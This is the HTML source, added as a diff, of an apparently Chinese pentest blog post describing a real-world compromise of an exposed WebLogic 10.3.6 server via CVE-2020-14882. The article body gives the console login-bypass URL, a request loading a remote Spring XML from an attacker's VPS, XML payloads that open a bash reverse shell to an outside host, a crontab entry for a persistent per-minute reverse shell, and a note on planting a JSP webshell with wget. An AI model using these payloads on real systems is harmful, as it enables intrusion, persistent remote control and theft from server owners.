@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>记一次实战weblogic渗透 | blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="weblogic," />
+  
+
+  <meta name="description" content="某次测试中发现一个开放在外网的weblogic，版本为10.3.6，直接输入&#x2F;console，就能打开管理页面   直接测试http:&#x2F;&#x2F;ip:port&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal能绕过console登录，直接进入后台，但后台权限较低，无法直接部署war包，于是根据vulhub，采用FileSystemXmlApplicationContex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次实战weblogic渗透">
+<meta property="og:url" content="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="某次测试中发现一个开放在外网的weblogic，版本为10.3.6，直接输入&#x2F;console，就能打开管理页面   直接测试http:&#x2F;&#x2F;ip:port&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal能绕过console登录，直接进入后台，但后台权限较低，无法直接部署war包，于是根据vulhub，采用FileSystemXmlApplicationContex">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112750237.png">
+<meta property="og:image" content="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112728397.png">
+<meta property="og:image" content="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114020053.png">
+<meta property="og:image" content="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116115656814.png">
+<meta property="og:image" content="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114531532.png">
+<meta property="og:image" content="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114812911.png">
+<meta property="article:published_time" content="2020-11-16T04:00:32.000Z">
+<meta property="article:modified_time" content="2020-11-16T04:00:33.007Z">
+<meta property="article:author" content="le31ei">
+<meta property="article:tag" content="weblogic">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112750237.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'G-4RKHRGTSTZ', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?ccc85f1c0e860658bc30a742eab6c9d0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+
+<meta name="generator" content="Hexo 5.0.2"><link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">HOME</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">HOME</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            search
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-记一次实战weblogic渗透" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">记一次实战weblogic渗透</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2020.11.16</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>le31ei</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Pentest/">Pentest</a>
+  </span>
+
+
+
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>某次测试中发现一个开放在外网的weblogic，版本为10.3.6，直接输入<code>/console</code>，就能打开管理页面</p>
+<p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112750237.png" alt="image-20201116112750237"></p>
+<p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112728397.png" alt="image-20201116112728397"></p>
+<p>直接测试<code>http://ip:port/console/css/%252e%252e%252fconsole.portal</code>能绕过console登录，直接进入后台，但后台权限较低，无法直接部署war包，于是根据vulhub，采用<code>FileSystemXmlApplicationContext</code>加载远程的xml进行攻击</p>
+<p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114020053.png" alt="image-20201116114020053"></p>
+<p>在远程服务器写入xml文件，并使用python搭建http server，<code>python -m SimpleHTTPServer 5555</code></p>
+<p>xml文件内容写上反弹shell的命令，并在weblogic中访问以下命令：<br><code>http://ip:port/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://vps:5555/rce.xml&quot;)</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是结果发现虽然有连接回来，但是生成不了shell</p>
+<p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116115656814.png" alt="image-20201116115656814"></p>
+<p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114531532.png" alt="image-20201116114531532"></p>
+<p>修改xml脚本，联想到平时在红蓝项目中，采用定时反弹shell的方式，直接写入crontab进行定时反弹，而不是在当前session进行反弹，修改后xml如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[echo -e &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/ip/9998;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&quot;|crontab -]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样每隔一分钟，服务器会定时反弹shell回来，这种方式避免了weblogic在加载xml时就回弹shell，导致可能不成功的情况。</p>
+<p>收到了反弹的shell</p>
+<p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114812911.png" alt="image-20201116114812911"></p>
+<p>反弹的bash shell不太好找web相关的配置参数，比如web.xml文件等，于是采用find命令全局查找，找到相关的web目录如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/weblogic/Oracle/Middleware/user_projects/domains/mweb_domain/servers/mwebServer/tmp/_WL_user/mweb/&#123;username&#125;/war/</span><br></pre></td></tr></table></figure>
+
+<p>可使用<code>wget</code>在该目录下写入jsp或者jspx的webshell</p>
+<p>以上便是本次实际应用中碰到的weblogic渗透，做此记录。</p>
+<p><strong>参考文档</strong></p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2020-14882">https://github.com/jas502n/CVE-2020-14882</a></li>
+</ol>
+
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              search
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+    <div id="comment" class="vcomment" ></div>
+    <script>
+        var notify = 'true' == true ? true : false;
+        var verify = 'false' == true ? true : false;
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+            return GUEST_INFO.indexOf(item) > -1
+        });
+        guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+        window.valine = new Valine({
+            el: '.vcomment',
+            notify: notify,
+            verify: verify,
+            appId: "UF41K2V1YdIabj0Hd9TXLuV9-gzGzoHsz",
+            appKey: "EfXnzBbp4gTCI4U99bctAjO8",
+            avatar:'mm',
+            placeholder: "Just go",
+            guest_info:guest_info,
+            pageSize:'10'
+        });
+    </script>
+  
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
